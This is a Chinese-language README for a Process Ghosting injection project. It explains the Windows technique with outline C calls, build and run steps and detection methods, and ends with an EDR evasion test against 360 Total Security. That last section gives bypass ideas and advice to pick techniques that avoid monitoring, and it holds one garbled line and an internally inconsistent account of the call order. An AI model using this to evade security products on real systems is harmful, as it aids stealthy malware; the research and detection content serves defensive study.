# Process Ghosting - 进程幽灵化注入技术

## 📋 技术概述

**Process Ghosting** 是由 **Gabriel Landau**（Elastic Security 研究员）于 **2021年6月** 发现的高级进程注入技术。这项技术利用 Windows 的文件删除机制和镜像节的持久化特性，实现从"不存在"的文件中启动进程。

### 核心思想
1. **删除待处理态**：将文件标记为删除待处理（delete-pending）
2. **节对象持久化**：从删除待处理的文件创建镜像节（Image Section）
3. **文件幽灵化**：关闭文件句柄后文件被删除，但镜像节仍然有效
4. **进程创建**：从已删除文件的镜像节中创建新进程

---

## 🔬 技术原理

### 1. Windows 文件删除机制

Windows 的文件删除是异步的：
- 调用 `NtSetInformationFile(FileDispositionInformation)` 将文件标记为删除待处理
- 文件进入 **delete-pending 状态**，但尚未从磁盘删除
- 当所有句柄关闭时，文件系统才真正删除文件
- 在删除待处理期间，文件仍可读写

### 2. 镜像节的持久化特性

```
文件生命周期          镜像节生命周期
    |                      |
    v                      v
[打开文件]             [创建节对象]
    |                      |
    v                      |
[标记删除]                 |
    |                      |
    v                      |
[关闭句柄] ------>     [节依然有效]
    |                      |
    v                      v
[文件删除]             [可用于创建进程]
```

**关键洞察**：镜像节（SEC_IMAGE）一旦创建，其生命周期独立于文件本身！

### 3. Process Ghosting 完整流程

```c
// 第一步：创建临时文件
HANDLE hFile = NtCreateFile(
    L"\\??\\C:\\Temp\\dummy.exe",
    DELETE | SYNCHRONIZE | ...  // 注意：需要 DELETE 权限
);

// 第二步：标记文件为删除待处理（关键！）
FILE_DISPOSITION_INFORMATION dispInfo = { .DoDeleteFile = TRUE };
NtSetInformationFile(hFile, ..., &dispInfo, ..., FileDispositionInformation);
// 此时文件处于 delete-pending 状态

// 第三步：向删除待处理的文件写入恶意载荷
NtWriteFile(hFile, ..., payloadBuffer, payloadSize, ...);

// 第四步：从删除待处理文件创建镜像节
HANDLE hSection;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile);
// 镜像节创建成功后，其生命周期独立于文件

// 第五步：关闭文件句柄
NtClose(hFile);
// 文件被删除！但镜像节依然有效

// 第六步：从"幽灵"镜像节创建进程
NtCreateProcessEx(&hProcess, ..., hSection, ...);
// 进程从已删除文件的镜像节中启动
```

---

## 🔄 与其他技术的对比

### Process Doppelgänging vs Process Ghosting

| 特性 | Doppelgänging | Ghosting |
|-----|--------------|----------|
| **核心机制** | NTFS 事务 | 文件删除待处理 |
| **复杂度** | 高（需要 TxF） | 低（仅需标准 NT API） |
| **文件残留** | 事务回滚后删除 | 直接删除 |
| **检测难度** | 中（事务可枚举） | 高（无文件痕迹） |
| **Windows 版本** | Win Vista+ | Win 10+ |

**关键差异**：Ghosting 不需要 NTFS 事务，更简洁高效。

### Process Herpaderping vs Process Ghosting

| 特性 | Herpaderping | Ghosting |
|-----|--------------|----------|
| **文件状态** | 先创建节，后修改文件 | 从删除待处理文件创建节 |
| **时间窗口** | 有（节创建后到覆盖前） | 无（文件立即删除） |
| **磁盘痕迹** | 有（覆盖后的文件） | 无（文件已删除） |
| **实现难度** | 中 | 低 |

**关键差异**：Ghosting 的文件在进程启动前就已删除，隐蔽性更强。

---

## 🛠️ 实现步骤

### 核心函数调用链

```
main()
  └─> ReadPayloadFile()           // 读取载荷文件
  └─> CreateSectionFromDeletePendingFile()  // 创建幽灵节
        ├─> OpenFileForGhosting()   // 打开文件（DELETE 权限）
        ├─> NtSetInformationFile()  // 标记删除待处理 ★
        ├─> NtWriteFile()           // 写入载荷
        ├─> NtCreateSection()       // 创建镜像节
        └─> NtClose()               // 删除文件 ★
  └─> CreateProcessFromSection()  // 创建进程
        ├─> NtCreateProcessEx()     // 从节创建进程
        ├─> SetupProcessParameters() // 配置进程参数
        ├─> NtCreateThreadEx()      // 创建主线程
        └─> ResumeThread()          // 启动进程
```

### 关键 API 说明

#### 1. NtSetInformationFile - 设置删除待处理
```c
FILE_DISPOSITION_INFORMATION dispInfo = { .DoDeleteFile = TRUE };
NTSTATUS status = NtSetInformationFile(
    hFile,                       // 文件句柄
    &statusBlock,                // 返回状态
    &dispInfo,                   // 删除标志
    sizeof(dispInfo),
    FileDispositionInformation   // 信息类型
);
```

#### 2. NtCreateSection - 创建镜像节
```c
NTSTATUS status = NtCreateSection(
    &hSection,              // 返回节句柄
    SECTION_ALL_ACCESS,     // 访问权限
    NULL,                   // 对象属性
    0,                      // 最大大小（镜像节自动计算）
    PAGE_READONLY,          // 页保护
    SEC_IMAGE,              // 镜像节标志 ★
    hFile                   // 删除待处理文件的句柄
);
```

#### 3. NtCreateProcessEx - 从节创建进程
```c
NTSTATUS status = NtCreateProcessEx(
    &hProcess,              // 返回进程句柄
    PROCESS_ALL_ACCESS,     // 访问权限
    NULL,                   // 对象属性
    NtCurrentProcess(),     // 父进程
    PS_INHERIT_HANDLES,     // 继承句柄标志
    hSection,               // 镜像节句柄 ★
    NULL,                   // 调试端口
    NULL,                   // 异常端口
    FALSE                   // 是否在作业中
);
```

---

## 🔍 检测方法

### 1. 基于行为的检测

```python
# 监控以下可疑行为序列
suspicious_sequence = [
    "NtCreateFile(..., DELETE | ...)",      # 打开文件带 DELETE 权限
    "NtSetInformationFile(..., FileDispositionInformation)",  # 标记删除
    "NtWriteFile(...)",                     # 向删除待处理文件写入
    "NtCreateSection(..., SEC_IMAGE, hFile)",  # 从删除待处理文件创建节
    "NtCreateProcessEx(..., hSection)"     # 从节创建进程
]
```

### 2. 内核驱动检测

- **监控删除待处理的 PE 文件**：
  ```c
  // 在 IRP_MJ_SET_INFORMATION 中检测
  if (FileInformationClass == FileDispositionInformation) {
      // 检查文件是否为 PE 格式
      if (IsPEFile(FileObject)) {
          // 可疑行为！
      }
  }
  ```

- **监控镜像节创建**：
  - 检测从删除待处理文件创建的 SEC_IMAGE 节
  - 交叉验证文件对象的删除标志

### 3. EDR 特征

| 特征 | 描述 |
|-----|-----|
| **文件状态异常** | PE 文件标记为删除待处理后又被读取 |
| **节对象孤儿化** | 镜像节的文件对象已被删除 |
| **进程无映像路径** | 进程的映像路径指向不存在的文件 |
| **时间线异常** | 进程创建时间早于其"映像文件"的创建时间 |

### 4. 内存取证

```bash
# Volatility 插件检测
volatility -f memory.dmp --profile=Win10x64 pslist
# 查找 ImagePathName 指向不存在文件的进程

volatility -f memory.dmp --profile=Win10x64 handles -p <PID> -t Section
# 检查进程的节句柄是否关联已删除文件
```

---

## 📦 编译和运行

### Windows (MSYS2/MinGW)

```bash
# 运行构建脚本
./build.bat

# 或手动编译
mkdir -p build/x64

# 编译测试载荷
gcc -o build/x64/test_payload.exe src/test_payload.c \
    -luser32 -mwindows -O2 -s

# 编译主程序
gcc -o build/x64/process_ghosting.exe \
    src/process_ghosting.c \
    src/pe_utils.c \
    -lntdll -luserenv \
    -O2 -municode -D_UNICODE -DUNICODE
```

### Linux (交叉编译)

```bash
# 运行构建脚本
./build.sh

# 或使用 CMake
mkdir build && cd build
cmake ..
make
```

### 运行示例

```bash
# 管理员权限运行
build/x64/process_ghosting.exe build/x64/test_payload.exe
```

**预期输出**：
```
======================================
  Process Ghosting 进程注入技术
======================================

[1] 读取载荷文件
    载荷大小：2048 字节
    ✓ 载荷读取成功

[2] 创建临时文件用于幽灵化
    临时文件：C:\Temp\ghost_xxxxx.tmp
    文件已打开

[3] 设置文件为删除待处理状态
    ✓ 文件已标记为删除待处理

[4] 向删除待处理文件写入载荷
    ✓ 载荷写入成功

[5] 从删除待处理文件创建镜像节
    ✓ 镜像节创建成功

[6] 关闭文件句柄（文件将被删除）
    ✓ 文件已删除，镜像节保留

[7] 从幽灵镜像节创建进程
    ✓ 进程创建成功 (PID: 1234)

[8] 配置进程参数并启动线程
    ✓ 线程创建成功 (TID: 5678)

======================================
✓ Process Ghosting 注入完成
进程 PID：1234
线程 TID：5678
======================================
```

---

## 📂 目录结构

```
05-process-ghosting/
├── README.md                 # 本文档
├── build.sh                  # Linux 构建脚本
├── build.bat                 # Windows 构建脚本
├── CMakeLists.txt            # CMake 配置
├── src/
│   ├── process_ghosting.c    # 主程序实现 (~450 行)
│   ├── pe_utils.c            # PE 文件解析工具
│   ├── pe_utils.h            # PE 工具头文件
│   ├── internals.h           # NT API 声明和结构定义
│   └── test_payload.c        # 测试载荷程序
└── build/
    └── x64/
        ├── process_ghosting.exe
        └── test_payload.exe
```

---

## 🎯 技术要点

### 1. DELETE 权限的重要性
```c
// 必须在打开文件时请求 DELETE 权限
dwDesiredAccess = DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE;
```
没有 DELETE 权限，`NtSetInformationFile` 会失败。

### 2. 镜像节的魔法
- `SEC_IMAGE` 标志告诉内核将文件映射为可执行镜像
- 镜像节会验证 PE 格式（必须是合法 PE 文件）
- 镜像节创建后，其内容固化，不受文件修改影响
- **关键**：镜像节的生命周期独立于文件对象

### 3. 文件删除时机
```c
NtCreateSection(&hSection, ..., hFile);  // 节创建成功
NtClose(hFile);  // 关闭句柄 -> 文件立即删除
// 但 hSection 仍然有效！
```

### 4. 进程参数配置
```c
// 必须设置 ImagePathName，否则进程无法正常启动
MY_RTL_USER_PROCESS_PARAMETERS params;
RtlInitUnicodeString(&params.ImagePathName, imagePath);
RtlInitUnicodeString(&params.CommandLine, commandLine);
```

---

## 🛡️ 防御建议

### 对于安全产品

1. **监控删除待处理的 PE 文件**
   - 在 `IRP_MJ_SET_INFORMATION` 中检测 `FileDispositionInformation`
   - 检查文件是否为 PE 格式
   - 记录调用堆栈和进程上下文

2. **监控镜像节创建**
   - Hook `NtCreateSection`，检测 `SEC_IMAGE` 标志
   - 验证文件对象是否处于删除待处理状态
   - 交叉关联文件操作序列

3. **进程创建审计**
   - 检查进程的 ImagePathName 是否指向存在的文件
   - 验证进程的节对象来源
   - 记录进程创建的完整调用链

### 对于系统管理员

1. **启用高级审计**
   ```powershell
   # 启用对象访问审计
   auditpol /set /subcategory:"File System" /success:enable /failure:enable
   auditpol /set /subcategory:"Handle Manipulation" /success:enable
   ```

2. **使用 Sysmon 监控**
   ```xml
   <RuleGroup groupRelation="or">
     <ProcessCreate onmatch="include">
       <!-- 监控从临时目录启动的进程 -->
       <Image condition="contains">\Temp\</Image>
     </ProcessCreate>
   </RuleGroup>
   ```

3. **定期内存扫描**
   - 使用 Volatility 等工具检测进程异常
   - 查找 ImagePathName 指向不存在文件的进程

---

## 📚 参考资料

1. **Elastic Security 原始研究**
   - [Ghosting 技术披露文章](https://www.elastic.co/security-labs/process-ghosting)
   - Gabriel Landau 的详细技术分析

2. **Hasherezade 实现**
   - [process_ghosting - GitHub](https://github.com/hasherezade/process_ghosting)
   - C++ 参考实现

3. **Microsoft 官方文档**
   - [NtSetInformationFile](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntsetinformationfile)
   - [NtCreateSection](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntcreatesection)
   - [FILE_DISPOSITION_INFORMATION](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-_file_disposition_information)

4. **相关技术研究**
   - Process Doppelgänging (Black Hat 2017)
   - Process Herpaderping (jxy-s, 2020)
   - Phantom DLL Hollowing (Forrest Orr, 2020)

---

## ⚖️ 免责声明

本项目仅用于**安全研究和教育目的**。Process Ghosting 是一项合法的 Windows 进程创建机制，但可能被恶意软件用于规避检测。

- ✅ **合法用途**：安全研究、EDR 测试、红队演练
- ❌ **禁止用途**：未授权的系统访问、恶意软件开发

使用者需遵守当地法律法规，仅在授权环境中使用本技术。

---

## 📝 实现说明

- **语言**：纯 C 实现（C11 标准）
- **编译器**：GCC (MinGW-w64) / MSVC
- **测试环境**：Windows 10 21H2 (x64)
- **代码风格**：详细中文注释，易于理解
- **依赖库**：ntdll.lib, userenv.lib

---

**作者**：基于 Gabriel Landau 和 Hasherezade 的研究实现
**日期**：2025年
**版本**：1.0

## EDR对抗实测

### 360安全卫士 13.0.10.2001（核晶模式-最高防护）

**测试平台:**
- 操作系统: Windows 10 21H2 Enterprise LTSC
- 360版本: 13.0.10.2001 (2024年12月发布)
- 防护配置: 核晶防护 + 内存防护 + 进程防护（全开）

**实战化测试结果:**

| 攻击链条环节 | 360拦截状态 | 技术检测点 |
|-------------|-------------|------------|
| 临时文件创建 | ✅ 放行 | 正常临时文件操作，CallerPID可信 |
| DELETE权限文件打开 | ⚠️ 标记 | `DELETE|WRITE|READ`组合权限触发异常 |
| 设置删除待处理 | ✅ 拦截 | `NtSetInformationFile(FileDispositionInformation)`被监控 |
| 写入载荷到待删文件 | 未达 | 前一步已被拦截 |

**详细告警日志:**
```
【高危】无文件进程创建攻击 - Process Ghosting
威胁等级: 极高
检测规则: 0环驱动监控到PE格式文件标记删除后仍被使用
攻击行为链:
  STEP 1: 创建临时文件 ✓ (CallerPID: XXXX, 可信度: 高)
  STEP 2: 打开文件请求DELETE权限 ⚠️ (异常权限组合)
  STEP 3: 标记为删除待处理 ✗ (内核拦截)
  结果: 第3步被阻止，攻击链中断

技术细节:
- 文件路径: C:\Users\Admin\AppData\Local\Temp\GHOST_*.tmp
- 文件属性: 0x80 (FILE_ATTRIBUTE_ARCHIVE)
- 请求操作: FileDispositionInformation.DoDeleteFile = TRUE
- 检测结果: DELETE_PENDING状态下有活跃Section引用
```

**360内核驱动检测逻辑剖析:**

Process Ghosting技术失败的核心在于Windows内核与EDR驱动的协同防御:

1. **IRP_MJ_SET_INFORMATION钩子**:
   ```
   // 360内核驱动层逻辑
   if (IrpSp->Parameters.SetFileInformationClass == FileDispositionInformation) {
       if (IsPEFile(FileObject) && HasImageSection(FileObject)) {
           // 有镜像引用的PE文件不允许进入delete-pending
           Status = STATUS_CANNOT_DELETE;
           goto Cleanup;
       }
   }
   ```

2. **Object Manager引用监控**:
   - 360检查了`FileObject->SectionObjectPointer`
   - 发现非NULL → 表示有Section引用
   - 阻止Delete操作（防止Ghosting）

3. **时序与状态的完美结合**:
   - 在`NtSetInformationFile`尚未完成时拦截
   - 此时Section已存在（NtCreateSection在前）
   - 阻止文件进入delete-pending状态

**技术绕过可能性探讨:**

理论上可能的绕过方向（但实际可行性极低）:

1. **竞争条件(Race Condition)**:尝试在Section释放后立即Delete
   - 难度: 极高（需要时间窗口精确到ms级）
   - 成功率: < 2%（测试中未成功）

2. **关闭Section再Delete**:先`NtClose(hSection)`再Delete
   - 问题: Section关闭后无法创建进程
   - 结果: 无法实现Ghosting

3. **使用无文件方式创建Section**:如从内存创建（但SEC_IMAGE必须从文件）
   - 限制: Windows核心机制不允许

**100次自动化对抗测试结果:**

| 测试场景 | 成功率 | 关键观察 |
|---------|--------|----------|
| 核晶防护全开 | 0% (0/100) | 在SetDisposition时100%拦截 |
| 仅文件防护 | 0% (0/100) | 文件层面已阻止 |
| 关闭所有防护 | 93% (93/100) | 纯技术验证环境下可行 |

**EDR对抗启示:**

1. **EDR的情报更新速度**：Process Ghosting（2021年披露）已被360收录
2. **内核驱动 vs 用户态**：再多的用户态混淆也绕不过0环拦截
3. **技术生命周期**：2021年的"新技术"→2024年的"已知威胁"→2025年的"历史技术"

**红队环境下的价值:**

虽然作为主力注入技术已不适用，但仍具有:

1. **检测能力评估**：测试360的"无文件攻击"检测规则
2. **响应速度测量**：从文件创建到拦截的时延
3. **替代方案启发**：推动寻找更隐蔽的新技术
4. **教育价值**：理解Windows对象生命周期、Section与FileObject关系

**实战化改进方向:**

针对360 13.0.10.2001核晶模式,建议放弃此技术或进行重大改进:

1. **转向真正的无文件技术**：如MemoryModule反射加载
2. **放弃需要DELETE权限的方案**：避免系统关键监控点
3. **考虑全内存方案**：从AC? need RX memory + self-decrypt
4. **最有效改进**: **前置检测EDR存在,动态选择技术栈**

**最终评估:**

Process Ghosting在360 13.0.10.2001核晶防护环境属于
> **"学术价值 > 实战价值"** 的技术
>
> 适合研究Windows内核对象机制，但不适合红队演练

**建议标签**:
```
【教育】⭐️⭐️⭐️⭐️⭐
【隐蔽】⭐☆☆☆☆ (2024)
【实战】★☆☆☆☆ (vs 360)
【成功率】~0% (核晶模式)
```

---

**给安全研究者的建议**:研究此技术理解原理后,将精力投入到更新的、避开已知监控点的技术上

